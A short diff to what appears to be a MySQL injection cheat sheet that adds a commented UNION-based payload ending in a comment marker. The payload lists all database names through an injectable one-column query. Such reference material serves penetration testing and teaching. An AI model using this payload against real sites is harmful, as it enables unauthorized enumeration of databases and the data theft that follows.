@@ -39,6 +39,9 @@ Get DBs
 
 ```MySQL
 SELECT group_concat(schema_name) FROM information_schema.schemata;
+
+# Assuming that only one column is searched
+# ' UNION SELECT group_concat(schema_name) FROM information_schema.schemata #
 ```
 
 Get tables in DB
